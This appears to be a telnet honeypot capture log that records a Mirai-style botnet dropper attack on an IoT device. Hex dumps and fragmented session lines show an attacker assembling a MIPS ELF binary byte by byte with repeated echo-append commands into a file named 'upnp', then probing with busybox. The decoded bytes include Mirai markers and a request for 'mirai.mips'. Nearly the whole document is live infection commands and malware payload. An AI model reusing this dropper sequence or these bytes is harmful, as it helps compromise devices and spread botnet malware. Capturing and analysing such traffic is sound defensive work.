+  00d0  62 31 5c 78 30 30 5c 78 62 34 5c 78 38 66 5c 78  b1\x00\xb4\x8f\x
+  00e0  62 30 5c 78 30 30 5c 78 62 30 5c 78 30 33 5c 78  b0\x00\xb0\x03\x
+  00f0  65 30 5c 78 30 30 5c 78 30 38 5c 78 32 37 5c 78  e0\x00\x08\x27\x
+  0100  62 64 5c 78 30 30 5c 78 63 38 5c 78 33 63 5c 78  bd\x00\xc8\x3c\x
+  0110  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0120  39 63 5c 78 38 31 5c 78 36 30 5c 78 30 33 5c 78  9c\x81\x60\x03\x
+  0130  39 39 5c 78 65 30 5c 78 32 31 5c 78 30 33 5c 78  99\xe0\x21\x03\x
+  0140  65 30 5c 78 30 30 5c 78 32 31 5c 78 30 34 5c 78  e0\x00\x21\x04\x
+  0150  31 31 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  11\x00\x01\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 30 5c 78 33 63 5c 78  00\x00\x00\x3c\x
+  0170  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0180  39 63 5c 78 38 31 5c 78 34 38 5c 78 30 33 5c 78  9c\x81\x48\x03\x
+  0190  39 66 5c 78 65 30 5c 78 32 31 5c 78 30 30 5c 78  9f\xe0\x21\x00\x
+  01a0  30 30 5c 78 66 38 5c 78 32 31 5c 78 38 66 5c 78  00\xf8\x21\x8f\x
+  01b0  39 39 5c 78 38 30 5c 78 33 63 5c 78 30 30 5c 78  99\x80\x3c\x00\x
+  01c0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  01d0  32 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  20\x00\x08\x00\x
+  01e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  01f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x03\x20\xf8\x09\x24\x06\x00\x04\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f \x99\x80\x54\x00\
+echooooo TELIN: x00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 03\
+echooooo TELIN: x20
+echooooo TELIN: \xf8
+echooooo TELIN: \x09\
+echooooo TELIN: x24\
+echooooo TELIN: x04
+echooooo TELIN: \x00\x
+echooooo TELIN: 05\x
+echooooo TELIN: 8f\xb
+echooooo TELIN: c\x0
+echooooo TELIN: 0\x10
+echooooo TELIN: \x8f 
+echooooo TELIN: \xbf\
+echooooo TELIN: x00\
+echooooo TELIN: xc0\x
+echooooo TELIN: 8f\x
+echooooo TELIN: b3\x00\
+echooooo TELIN: xbc\x8f\xb2\x00\xb8\x8f\xb1\
+echooooo TELIN: x00\
+echooooo TELIN: xb4
+echooooo TELIN: \x8
+echooooo TELIN: f\xb0\x
+echooooo TELIN: 00\xb
+echooooo TELIN: 0\x
+echooooo TELIN: 03 \x
+echooooo TELIN: e0\x00\x
+echooooo TELIN: 08\x
+echooooo TELIN: 27\
+echooooo TELIN: xbd\x
+echooooo TELIN: 00\x
+echooooo TELIN: c8\x
+echooooo TELIN: 3c\
+echooooo TELIN: x1c\
+echooooo TELIN: x00\
+echooooo TELIN: x05\x
+echooooo TELIN: 27\x
+echooooo TELIN: 9c\x
+echooooo TELIN: 81\x
+echooooo TELIN: 60\x
+echooooo TELIN: 03\
+echooooo TELIN: x99\xe0\x
+echooooo TELIN: 21\x03 \xe
+echooooo TELIN: 0\x00\x21\x04\
+echooooo TELIN: x11\x
+echooooo TELIN: 00\x
+echooooo TELIN: 01\x00\x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x00\x3c
+echooooo TELIN: \x1c\x
+echooooo TELIN: 00\x05\x
+echooooo TELIN: 27\x
+echooooo TELIN: 9c\x
+echooooo TELIN: 81\
+echooooo TELIN: x48\
+echooooo TELIN: x03 \
+echooooo TELIN: x9f\
+echooooo TELIN: xe0\x2
+echooooo TELIN: 1\x00
+echooooo TELIN: \x00
+echooooo TELIN: \xf8
+echooooo TELIN: \x2
+echooooo TELIN: 1\x8
+echooooo TELIN: f\x
+echooooo TELIN: 99\x
+echooooo TELIN: 80\x3c
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x00\x03
+echooooo TELIN: \x2
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x08\x00 \x00\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00\x00\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: '
+echooooo TELIN:  >> u
+echooooo TELIN: pnp; /bin/
+echooooo TELIN: bus
+echooooo TELIN: ybox
+echooooo TELIN:  EC
+echooooo TELIN: CHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 33 63 5c 78  echo -ne '\x3c\x
+  0010  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0020  39 63 5c 78 38 31 5c 78 32 30 5c 78 30 33 5c 78  9c\x81\x20\x03\x
+  0030  39 39 5c 78 65 30 5c 78 32 31 5c 78 30 30 5c 78  99\xe0\x21\x00\x
+  0040  38 30 5c 78 31 30 5c 78 32 31 5c 78 30 30 5c 78  80\x10\x21\x00\x
+  0050  61 30 5c 78 32 30 5c 78 32 31 5c 78 30 30 5c 78  a0\x20\x21\x00\x
+  0060  63 30 5c 78 32 38 5c 78 32 31 5c 78 30 30 5c 78  c0\x28\x21\x00\x
+  0070  65 30 5c 78 33 30 5c 78 32 31 5c 78 38 66 5c 78  e0\x30\x21\x8f\x
+  0080  61 37 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  a7\x00\x10\x8f\x
+  0090  61 38 5c 78 30 30 5c 78 31 34 5c 78 38 66 5c 78  a8\x00\x14\x8f\x
+  00a0  61 39 5c 78 30 30 5c 78 31 38 5c 78 38 66 5c 78  a9\x00\x18\x8f\x
+  00b0  61 61 5c 78 30 30 5c 78 31 63 5c 78 32 37 5c 78  aa\x00\x1c\x27\x
+  00c0  62 64 5c 78 66 66 5c 78 65 30 5c 78 61 66 5c 78  bd\xff\xe0\xaf\x
+  00d0  61 38 5c 78 30 30 5c 78 31 30 5c 78 61 66 5c 78  a8\x00\x10\xaf\x
+  00e0  61 39 5c 78 30 30 5c 78 31 34 5c 78 61 66 5c 78  a9\x00\x14\xaf\x
+  00f0  61 61 5c 78 30 30 5c 78 31 38 5c 78 61 66 5c 78  aa\x00\x18\xaf\x
+  0100  61 32 5c 78 30 30 5c 78 31 63 5c 78 38 66 5c 78  a2\x00\x1c\x8f\x
+  0110  61 32 5c 78 30 30 5c 78 31 63 5c 78 30 30 5c 78  a2\x00\x1c\x00\x
+  0120  30 30 5c 78 30 30 5c 78 30 63 5c 78 31 34 5c 78  00\x00\x0c\x14\x
+  0130  65 30 5c 78 30 30 5c 78 30 33 5c 78 32 37 5c 78  e0\x00\x03\x27\x
+  0140  62 64 5c 78 30 30 5c 78 32 30 5c 78 30 33 5c 78  bd\x00\x20\x03\x
+  0150  65 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  e0\x00\x08\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0170  34 30 5c 78 32 30 5c 78 32 31 5c 78 38 66 5c 78  40\x20\x21\x8f\x
+  0180  39 39 5c 78 38 30 5c 78 34 30 5c 78 30 30 5c 78  99\x80\x40\x00\x
+  0190  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  01a0  32 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  20\x00\x08\x00\x
+  01b0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  01c0  30 30 5c 78 30 30 5c 78 30 30 5c 78 33 63 5c 78  00\x00\x00\x3c\x
+  01d0  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  01e0  39 63 5c 78 38 30 5c 78 62 30 5c 78 30 33 5c 78  9c\x80\xb0\x03\x
+  01f0  39 39 5c 78 65 30 5c 78 32 31 5c 78 32 37 5c 78  99\xe0\x21\x27\x
+  0200  62 64 5c 78 66 66 5c 78 65 30 27 20 3e 3e 20 75  bd\xff\xe0' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x3c\x1c\x00\x05\x27\x9c\x81\x20\x03\x99\xe0\x21\x00\x80\x10\x21\x00 \xa0\x20\x21\x00\x
+echooooo TELIN: c0\x28\
+echooooo TELIN: x21\
+echooooo TELIN: x00\x
+echooooo TELIN: e0\x
+echooooo TELIN: 30\x2
+echooooo TELIN: 1\x8f
+echooooo TELIN: \xa7
+echooooo TELIN: \x00
+echooooo TELIN: \x10\x
+echooooo TELIN: 8f\xa8\
+echooooo TELIN: x00\x14\x8
+echooooo TELIN: f \xa9\x00
+echooooo TELIN: \x18\x8f\xaa\x00\x1
+echooooo TELIN: c\x27\xbd\
+echooooo TELIN: xff\xe0\xaf\
+echooooo TELIN: xa8\x00\x10
+echooooo TELIN: \xaf\xa9
+echooooo TELIN: \x00\x1
+echooooo TELIN: 4\x
+echooooo TELIN: af \xaa
+echooooo TELIN: \x00
+echooooo TELIN: \x1
+echooooo TELIN: 8\xaf\xa2\
+echooooo TELIN: x00\x1c
+echooooo TELIN: \x8f\x
+echooooo TELIN: a2\x00
+echooooo TELIN: \x1c\x00\x00\x00\
+echooooo TELIN: x0c\x
+echooooo TELIN: 14\xe
+echooooo TELIN: 0\x00\x03\x27 \xb
+echooooo TELIN: d\x00\x20
+echooooo TELIN: \x03\xe0\x
+echooooo TELIN: 00\x08
+echooooo TELIN: \x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\
+echooooo TELIN: x00\x00\x40\x20\x
+echooooo TELIN: 21\x8f
+echooooo TELIN: \x99\x80\
+echooooo TELIN: x40\
+echooooo TELIN: x00 
+echooooo TELIN: \x00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x03\x
+echooooo TELIN: 20\x00\
+echooooo TELIN: x08\x00\x00\
+echooooo TELIN: x00\x00\x00\x00\x0
+echooooo TELIN: 0\x00\x3
+echooooo TELIN: c\x1
+echooooo TELIN: c\x00
+echooooo TELIN: \x0
+echooooo TELIN: 5\x
+echooooo TELIN: 27 \
+echooooo TELIN: x9c
+echooooo TELIN: \x80\xb
+echooooo TELIN: 0\x03
+echooooo TELIN: \x99
+echooooo TELIN: \xe0\x21\x27\xb
+echooooo TELIN: d\xff\xe
+echooooo TELIN: 0' >> up
+echooooo TELIN: np; /
+echooooo TELIN: bin/bu
+echooooo TELIN: sybox ECCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 61 66 5c 78  echo -ne '\xaf\x
+  0010  62 66 5c 78 30 30 5c 78 31 63 5c 78 61 66 5c 78  bf\x00\x1c\xaf\x
+  0020  62 30 5c 78 30 30 5c 78 31 38 5c 78 61 66 5c 78  b0\x00\x18\xaf\x
+  0030  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  0040  39 39 5c 78 38 30 5c 78 33 34 5c 78 30 30 5c 78  99\x80\x34\x00\x
+  0050  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0060  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 30 5c 78  20\xf8\x09\x00\x
+  0070  38 30 5c 78 38 30 5c 78 32 31 5c 78 38 66 5c 78  80\x80\x21\x8f\x
+  0080  62 63 5c 78 30 30 5c 78 31 30 5c 78 61 63 5c 78  bc\x00\x10\xac\x
+  0090  35 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  50\x00\x00\x8f\x
+  00a0  62 66 5c 78 30 30 5c 78 31 63 5c 78 38 66 5c 78  bf\x00\x1c\x8f\x
+  00b0  62 30 5c 78 30 30 5c 78 31 38 5c 78 32 34 5c 78  b0\x00\x18\x24\x
+  00c0  30 32 5c 78 66 66 5c 78 66 66 5c 78 30 33 5c 78  02\xff\xff\x03\x
+  00d0  65 30 5c 78 30 30 5c 78 30 38 5c 78 32 37 5c 78  e0\x00\x08\x27\x
+  00e0  62 64 5c 78 30 30 5c 78 32 30 5c 78 30 30 5c 78  bd\x00\x20\x00\x
+  00f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0100  30 30 5c 78 30 30 5c 78 30 30 5c 78 33 63 5c 78  00\x00\x00\x3c\x
+  0110  31 63 5c 78 30 30 5c 78 30 35 5c 78 32 37 5c 78  1c\x00\x05\x27\x
+  0120  39 63 5c 78 38 30 5c 78 36 30 5c 78 30 33 5c 78  9c\x80\x60\x03\x
+  0130  39 39 5c 78 65 30 5c 78 32 31 5c 78 38 66 5c 78  99\xe0\x21\x8f\x
+  0140  38 32 5c 78 38 30 5c 78 33 30 5c 78 30 33 5c 78  82\x80\x30\x03\x
+  0150  65 30 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  e0\x00\x08\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0170  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0180  30 30 5c 78 30 30 5c 78 30 30 5c 78 36 64 5c 78  00\x00\x00\x6d\x
+  0190  36 39 5c 78 37 30 5c 78 37 33 5c 78 30 30 5c 78  69\x70\x73\x00\x
+  01a0  30 30 5c 78 30 30 5c 78 30 30 5c 78 34 64 5c 78  00\x00\x00\x4d\x
+  01b0  34 39 5c 78 35 32 5c 78 34 31 5c 78 34 39 5c 78  49\x52\x41\x49\x
+  01c0  30 61 5c 78 30 30 5c 78 30 30 5c 78 36 34 5c 78  0a\x00\x00\x64\x
+  01d0  37 36 5c 78 37 32 5c 78 34 38 5c 78 36 35 5c 78  76\x72\x48\x65\x
+  01e0  36 63 5c 78 37 30 5c 78 36 35 5c 78 37 32 5c 78  6c\x70\x65\x72\x
+  01f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 34 65 5c 78  00\x00\x00\x4e\x
+  0200  34 39 5c 78 34 36 5c 78 30 61 27 20 3e 3e 20 75  49\x46\x0a' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: echo -ne '\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x34\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f\xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x60\x03\x99\xe0\x21\x8f\x82\x80\x30\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d\x69\x70\x73\x00\x00\x00\x00\x4d\x49\x52\x41\x49\x0a\x00\x00\x64\x76\x72\x48\x65\x6c\x70\x65\x72\x00\x00\x00\x4e\x49\x46\x0a' >> upnp; /bin/busybox ECCHI
+
+echooooo TELIN: # echo -ne '\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x34\x00 \x00\x00\x00\x03\x20\xf
+echooooo TELIN: 8\x0
+echooooo TELIN: 9\x
+echooooo TELIN: 00\x80
+echooooo TELIN: \x80
+echooooo TELIN: \x21\x
+echooooo TELIN: 8f\x
+echooooo TELIN: bc\x0
+echooooo TELIN: 0\x10\xac\x5
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x8f \
+echooooo TELIN: xbf
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 1c\x
+echooooo TELIN: 8f\xb
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x18\x24\x
+echooooo TELIN: 02\xff\xff\x03\x
+echooooo TELIN: e0\x00\x08
+echooooo TELIN: \x27\
+echooooo TELIN: xbd\x00\x20\x
+echooooo TELIN: 00 \x00\x0
+echooooo TELIN: 0\x00\x00
+echooooo TELIN: \x00\x00\x00\x3c
+echooooo TELIN: \x1c\x
+echooooo TELIN: 00\x
+echooooo TELIN: 05\x2
+echooooo TELIN: 7\x9c
+echooooo TELIN: \x80\
+echooooo TELIN: x60\
+echooooo TELIN: x03\
+echooooo TELIN: x99\
+echooooo TELIN: xe0\x
+echooooo TELIN: 21\x8f 
+echooooo TELIN: \x82\
+echooooo TELIN: x80\x3
+echooooo TELIN: 0\x03
+echooooo TELIN: \xe0
+echooooo TELIN: \x00
+echooooo TELIN: \x08
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x00
+echooooo TELIN: \x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x00\x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 6d \x69\x
+echooooo TELIN: 70\x73\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x00\x4d\x49
+echooooo TELIN: \x52
+echooooo TELIN: \x4
+echooooo TELIN: 1\x4
+echooooo TELIN: 9\x
+echooooo TELIN: 0a\
+echooooo TELIN: x00\x00\x64\x76
+echooooo TELIN: \x72
+echooooo TELIN: \x48\
+echooooo TELIN: x65 \x
+echooooo TELIN: 6c\x
+echooooo TELIN: 70\x6
+echooooo TELIN: 5\x7
+echooooo TELIN: 2\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00\
+echooooo TELIN: x4e\x49\x
+echooooo TELIN: 46\x0a' >
+echooooo TELIN: > upn
+echooooo TELIN: p; 
+echooooo TELIN: /bin/busybox E
+echooooo TELIN: CCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  30 30 5c 78 30 30 5c 78 30 30 5c 78 34 37 5c 78  00\x00\x00\x47\x
+  0020  34 35 5c 78 35 34 5c 78 32 30 5c 78 32 66 5c 78  45\x54\x20\x2f\x
+  0030  36 32 5c 78 36 39 5c 78 36 65 5c 78 37 33 5c 78  62\x69\x6e\x73\x
+  0040  32 66 5c 78 36 64 5c 78 36 39 5c 78 37 32 5c 78  2f\x6d\x69\x72\x
+  0050  36 31 5c 78 36 39 5c 78 32 65 5c 78 36 64 5c 78  61\x69\x2e\x6d\x
+  0060  36 39 5c 78 37 30 5c 78 37 33 5c 78 32 30 5c 78  69\x70\x73\x20\x
+  0070  34 38 5c 78 35 34 5c 78 35 34 5c 78 35 30 5c 78  48\x54\x54\x50\x
+  0080  32 66 5c 78 33 31 5c 78 32 65 5c 78 33 30 5c 78  2f\x31\x2e\x30\x
+  0090  30 64 5c 78 30 61 5c 78 30 64 5c 78 30 61 5c 78  0d\x0a\x0d\x0a\x
+  00a0  30 30 5c 78 30 30 5c 78 30 30 5c 78 34 36 5c 78  00\x00\x00\x46\x
+  00b0  34 39 5c 78 34 65 5c 78 30 61 5c 78 30 30 5c 78  49\x4e\x0a\x00\x
+  00c0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00d0  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 30 5c 78  00\x00\x00\x80\x
+  00e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00f0  34 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  40\x00\x00\x00\x
+  0100  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0110  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0120  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0140  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0150  34 34 5c 78 30 36 5c 78 39 30 5c 78 30 30 5c 78  44\x06\x90\x00\x
+  0160  34 30 5c 78 30 35 5c 78 63 30 5c 78 30 30 5c 78  40\x05\xc0\x00\x
+  0170  34 30 5c 78 30 31 5c 78 39 63 5c 78 30 30 5c 78  40\x01\x9c\x00\x
+  0180  34 30 5c 78 30 32 5c 78 31 30 5c 78 30 30 5c 78  40\x02\x10\x00\x
+  0190  34 30 5c 78 30 35 5c 78 37 30 5c 78 30 30 5c 78  40\x05\x70\x00\x
+  01a0  34 30 5c 78 30 31 5c 78 32 38 5c 78 30 30 5c 78  40\x01\x28\x00\x
+  01b0  34 30 5c 78 30 31 5c 78 37 34 5c 78 30 30 5c 78  40\x01\x74\x00\x
+  01c0  34 30 5c 78 30 30 5c 78 61 30 5c 78 30 30 5c 78  40\x00\xa0\x00\x
+  01d0  34 30 5c 78 30 31 5c 78 63 34 5c 78 30 30 5c 78  40\x01\xc4\x00\x
+  01e0  34 30 5c 78 30 30 5c 78 63 38 5c 78 30 30 5c 78  40\x00\xc8\x00\x
+  01f0  34 30 5c 78 30 30 5c 78 65 34 5c 78 30 30 5c 78  40\x00\xe4\x00\x
+  0200  34 30 5c 78 30 35 5c 78 30 30 27 20 3e 3e 20 75  40\x05\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\x00\x00\x00\x47\x45\x54\x20\x2f\x62\x69\x6e\x73\x2f\x6d\x69\x72 \
+echooooo TELIN: x61\x69\
+echooooo TELIN: x2e\x6d\x69\x
+echooooo TELIN: 70\x
+echooooo TELIN: 73\x
+echooooo TELIN: 20\x4
+echooooo TELIN: 8\x54\x54\x50\x2f\x31\x
+echooooo TELIN: 2e\x30
+echooooo TELIN: \x0d\x0a
+echooooo TELIN: \x0
+echooooo TELIN: d\x0a 
+echooooo TELIN: \x0
+echooooo TELIN: 0\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 46\x49
+echooooo TELIN: \x4e
+echooooo TELIN: \x0a\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00\x00
+echooooo TELIN: \x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 80\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x00
+echooooo TELIN: \x00 \x40\
+echooooo TELIN: x00\x00\x00\
+echooooo TELIN: x00\x00\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 00 \x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x00\
+echooooo TELIN: x00
+echooooo TELIN: \x44
+echooooo TELIN: \x06
+echooooo TELIN: \x9
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 40\x05\x
+echooooo TELIN: c0\x
+echooooo TELIN: 00\x4
+echooooo TELIN: 0\x01\x9
+echooooo TELIN: c\x
+echooooo TELIN: 00\
+echooooo TELIN: x40\x02\x10\x00 \x40\x05\x70\x0
+echooooo TELIN: 0\x40\x01
+echooooo TELIN: \x28\x0
+echooooo TELIN: 0\x4
+echooooo TELIN: 0\x0
+echooooo TELIN: 1\x
+echooooo TELIN: 74\x0
+echooooo TELIN: 0\x4
+echooooo TELIN: 0\x00\xa
+echooooo TELIN: 0\x00\x40
+echooooo TELIN: \x01\xc4\x00 \x40\
+echooooo TELIN: x00\
+echooooo TELIN: xc8\x
+echooooo TELIN: 00\x
+echooooo TELIN: 40\
+echooooo TELIN: x00\
+echooooo TELIN: xe4
+echooooo TELIN: \x0
+echooooo TELIN: 0\x40
+echooooo TELIN: \x05
+echooooo TELIN: \x00
+echooooo TELIN: ' >> up
+echooooo TELIN: np
+echooooo TELIN: ; /b
+echooooo TELIN: in/b
+echooooo TELIN: usybox ECCHI
+echooooo TELIN: 
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 30 5c 78  echo -ne '\x00\x
+  0010  34 30 5c 78 30 31 5c 78 30 30 5c 78 30 30 5c 78  40\x01\x00\x00\x
+  0020  32 65 5c 78 37 33 5c 78 36 38 5c 78 37 33 5c 78  2e\x73\x68\x73\x
+  0030  37 34 5c 78 37 32 5c 78 37 34 5c 78 36 31 5c 78  74\x72\x74\x61\x
+  0040  36 32 5c 78 30 30 5c 78 32 65 5c 78 37 34 5c 78  62\x00\x2e\x74\x
+  0050  36 35 5c 78 37 38 5c 78 37 34 5c 78 30 30 5c 78  65\x78\x74\x00\x
+  0060  32 65 5c 78 37 32 5c 78 36 66 5c 78 36 34 5c 78  2e\x72\x6f\x64\x
+  0070  36 31 5c 78 37 34 5c 78 36 31 5c 78 30 30 5c 78  61\x74\x61\x00\x
+  0080  32 65 5c 78 36 37 5c 78 36 66 5c 78 37 34 5c 78  2e\x67\x6f\x74\x
+  0090  30 30 5c 78 32 65 5c 78 36 32 5c 78 37 33 5c 78  00\x2e\x62\x73\x
+  00a0  37 33 5c 78 30 30 5c 78 32 65 5c 78 36 64 5c 78  73\x00\x2e\x6d\x
+  00b0  36 34 5c 78 36 35 5c 78 36 32 5c 78 37 35 5c 78  64\x65\x62\x75\x
+  00c0  36 37 5c 78 32 65 5c 78 36 31 5c 78 36 32 5c 78  67\x2e\x61\x62\x
+  00d0  36 39 5c 78 33 33 5c 78 33 32 5c 78 30 30 5c 78  69\x33\x32\x00\x
+  00e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  00f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0100  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0110  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0120  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0140  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0150  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0170  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0180  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0190  30 30 5c 78 30 30 5c 78 30 62 5c 78 30 30 5c 78  00\x00\x0b\x00\x
+  01a0  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  01b0  30 30 5c 78 30 30 5c 78 30 36 5c 78 30 30 5c 78  00\x00\x06\x00\x
+  01c0  34 30 5c 78 30 30 5c 78 61 30 5c 78 30 30 5c 78  40\x00\xa0\x00\x
+  01d0  30 30 5c 78 30 30 5c 78 61 30 5c 78 30 30 5c 78  00\x00\xa0\x00\x
+  01e0  30 30 5c 78 30 35 5c 78 34 30 5c 78 30 30 5c 78  00\x05\x40\x00\x
+  01f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x00\x40\x01\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74 \x65\x78\x74\x00\
